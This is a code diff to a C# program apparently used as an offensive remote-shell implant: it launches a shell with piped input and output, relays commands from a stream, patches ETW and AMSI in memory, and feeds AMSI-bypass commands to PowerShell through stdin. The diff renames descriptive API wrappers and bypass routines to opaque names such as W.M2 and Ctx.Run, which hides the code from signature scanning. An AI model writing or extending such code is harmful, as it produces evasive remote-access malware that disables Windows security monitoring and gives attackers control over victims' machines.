@@ -72,11 +72,11 @@ namespace SvcUtil
         {
             var session = new SessionData { Stream = stream, Running = true };
 
-            bool isPowerShell = patchScan && ScanPatch.IsPowerShell(commandLine);
+            bool isPowerShell = patchScan && Ctx.Chk(commandLine);
 
             // Method 1: local process patch (ETW + AMSI in current process)
             if (patchScan)
-                ScanPatch.PatchCurrentProcess();
+                Ctx.Run();
 
             if (!CreateSession(commandLine, session))
                 return false;
@@ -88,7 +88,7 @@ namespace SvcUtil
                 // just stdin reflection, each line individually passes AMSI.
                 Thread.Sleep(500);
 
-                ScanPatch.InjectViaStdin(session.WritePipeHandle);
+                Ctx.IS(session.WritePipeHandle);
 
                 // Wait for PowerShell to process all bypass commands,
                 // then drain the pipe to discard banner + command echoes.
@@ -115,7 +115,7 @@ namespace SvcUtil
             writer.Start();
 
             // Wait for child process to exit
-            DynInvoke.WaitForSingleObject(session.ProcessHandle, -1);
+            W.MA(session.ProcessHandle, -1);
 
             // Signal threads to stop and wait for them
             session.Running = false;
@@ -146,15 +146,15 @@ namespace SvcUtil
                 IntPtr shellStdout = IntPtr.Zero;
 
                 // Pipe for shell stdin: we write → shell reads
-                if (!DynInvoke.CreatePipe(ref shellStdin,
+                if (!W.M3(ref shellStdin,
                                           ref session.WritePipeHandle, pSa, 0))
                     return false;
 
                 // Pipe for shell stdout: shell writes → we read
-                if (!DynInvoke.CreatePipe(ref session.ReadPipeHandle,
+                if (!W.M3(ref session.ReadPipeHandle,
                                           ref shellStdout, pSa, 0))
                 {
-                    DynInvoke.CloseHandle(shellStdin);
+                    W.M4(shellStdin);
                     return false;
                 }
 
@@ -164,17 +164,17 @@ namespace SvcUtil
                 // Start the shell process
                 if (!StartShell(commandLine, session))
                 {
-                    DynInvoke.CloseHandle(shellStdin);
-                    DynInvoke.CloseHandle(shellStdout);
-                    DynInvoke.CloseHandle(session.ReadPipeHandle);
-                    DynInvoke.CloseHandle(session.WritePipeHandle);
+                    W.M4(shellStdin);
+                    W.M4(shellStdout);
+                    W.M4(session.ReadPipeHandle);
+                    W.M4(session.WritePipeHandle);
                     return false;
                 }
 
                 // Close the child-side pipe handles in our process
                 // (the child inherited them via CreateProcess)
-                DynInvoke.CloseHandle(shellStdout);
-                DynInvoke.CloseHandle(shellStdin);
+                W.M4(shellStdout);
+                W.M4(shellStdin);
 
                 return true;
             }
@@ -197,10 +197,10 @@ namespace SvcUtil
             si.hStdOutput = session.ShellStdoutPipe;
 
             // Duplicate stdout handle for stderr
-            IntPtr currentProc = DynInvoke.GetCurrentProcess();
+            IntPtr currentProc = W.M6();
             IntPtr hStdErr = IntPtr.Zero;
 
-            if (!DynInvoke.DuplicateHandle(currentProc, session.ShellStdoutPipe,
+            if (!W.M5(currentProc, session.ShellStdoutPipe,
                                             currentProc, ref hStdErr,
                                             0, true, DUPLICATE_SAME_ACCESS))
                 return false;
@@ -208,20 +208,20 @@ namespace SvcUtil
             si.hStdError = hStdErr;
 
             PROCESS_INFORMATION pi;
-            if (!DynInvoke.CreateProcessW(null, commandLine,
+            if (!W.M2(null, commandLine,
                                            IntPtr.Zero, IntPtr.Zero,
                                            true, 0, IntPtr.Zero, null,
                                            ref si, out pi))
             {
-                DynInvoke.CloseHandle(hStdErr);
+                W.M4(hStdErr);
                 return false;
             }
 
             // Close duplicated stderr handle in parent (child inherited it)
-            DynInvoke.CloseHandle(hStdErr);
+            W.M4(hStdErr);
 
             session.ProcessHandle = pi.hProcess;
-            DynInvoke.CloseHandle(pi.hThread);
+            W.M4(pi.hThread);
 
             return true;
         }
@@ -236,7 +236,7 @@ namespace SvcUtil
             {
                 int bytesRead, bytesAvailable;
 
-                if (!DynInvoke.PeekNamedPipe(session.ReadPipeHandle,
+                if (!W.M7(session.ReadPipeHandle,
                         pipeBuf, pipeBuf.Length,
                         out bytesRead, out bytesAvailable, IntPtr.Zero))
                     break;
@@ -250,7 +250,7 @@ namespace SvcUtil
                 // Read exactly what is available (up to buffer size)
                 int toRead = Math.Min(bytesAvailable, pipeBuf.Length);
                 int actualRead;
-                if (!DynInvoke.ReadFile(session.ReadPipeHandle,
+                if (!W.M8(session.ReadPipeHandle,
                         pipeBuf, toRead, out actualRead, IntPtr.Zero))
                     break;
 
@@ -303,7 +303,7 @@ namespace SvcUtil
                         // Not a special command — forward the line + newline to shell
                         byte[] lineBytes = Encoding.UTF8.GetBytes(line + "\n");
                         int written;
-                        DynInvoke.WriteFile(session.WritePipeHandle,
+                        W.M9(session.WritePipeHandle,
                             lineBytes, (uint)lineBytes.Length,
                             out written, IntPtr.Zero);
                     }
@@ -322,7 +322,7 @@ namespace SvcUtil
                         byte[] raw = Encoding.UTF8.GetBytes(lineBuilder.ToString());
                         lineBuilder.Clear();
                         int written;
-                        DynInvoke.WriteFile(session.WritePipeHandle,
+                        W.M9(session.WritePipeHandle,
                             raw, (uint)raw.Length, out written, IntPtr.Zero);
                     }
                 }
@@ -339,7 +339,7 @@ namespace SvcUtil
             while (true)
             {
                 int bytesRead, bytesAvailable;
-                if (!DynInvoke.PeekNamedPipe(pipeHandle, buf, buf.Length,
+                if (!W.M7(pipeHandle, buf, buf.Length,
                         out bytesRead, out bytesAvailable, IntPtr.Zero))
                     break;
 
@@ -347,7 +347,7 @@ namespace SvcUtil
                     break;
 
                 int actual;
-                DynInvoke.ReadFile(pipeHandle, buf,
+                W.M8(pipeHandle, buf,
                     Math.Min(bytesAvailable, buf.Length),
                     out actual, IntPtr.Zero);
             }
@@ -370,7 +370,7 @@ namespace SvcUtil
         {
             if (handle != IntPtr.Zero)
             {
-                DynInvoke.CloseHandle(handle);
+                W.M4(handle);
                 handle = IntPtr.Zero;
             }
         }
